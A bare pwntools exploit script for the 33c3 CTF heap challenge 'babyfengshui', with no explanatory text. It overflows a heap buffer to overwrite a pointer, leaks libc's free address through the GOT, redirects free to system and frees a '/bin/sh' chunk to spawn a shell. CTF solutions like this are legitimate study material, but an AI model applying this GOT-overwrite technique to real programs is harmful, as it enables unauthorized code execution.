#### heap
#####babyfengshui 33c3_ctf
```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *

context(arch = 'i386', os = 'linux', endian = 'little')
context.log_level = 'debug'

elf_path = './babyfengshui'
so_path = './libc.so.6'


def add_user(size, name, text):
    p.recvuntil("Action: ")
    p.sendline("0")
    p.recvuntil("description: ")
    p.sendline(str(size))
    p.recvuntil("name: ")
    #p.send(name + "\n")
    p.sendline(name)
    p.recvuntil("text length: ")
    p.sendline(str(len(text)))
    p.recvuntil("text: ")
    p.send(text)


def del_user(select):
    p.recvuntil("Action: ")
    p.sendline("1")
    p.recvuntil("index: ")
    p.sendline(str(select))

def list_user(select):
    p.recvuntil("Action: ")
    p.sendline("2")
    p.recvuntil("index: ")
    p.sendline(str(select))

def update_user(index, text):
    p.recvuntil("Action: ")
    p.sendline("3")
    p.recvuntil("index: ")
    p.sendline(str(index))
    p.recvuntil("text length: ")
    p.sendline(str(len(text)))
    p.recvuntil("text: ")
    p.send(text)


if __name__ == '__main__':
    elf = ELF(elf_path)
    so = ELF(so_path)
    p = process(elf_path)
    print proc.pidof(p)
    raw_input('gdb ...')
    free_got = elf.got['free']
    print hex(free_got)

    add_user(0x80, "aaa", "a" * 80)
    add_user(0x80, "kkk", "k" * 80)
    add_user(0x80, "bbb", "/bin/sh\x00")
    del_user(0)
    add_user(0x108, "ccc", "x" * 0x198 + p32(free_got))
    list_user(1)

    p.recvuntil("description: ")
    free_addr = u32(p.recv(4))
    print hex(free_addr)
    system_addr = free_addr - (so.symbols['free'] - so.symbols['system'])
    print hex(system_addr)
    update_user(1, p32(system_addr))
    del_user(2)

    p.interactive()

```
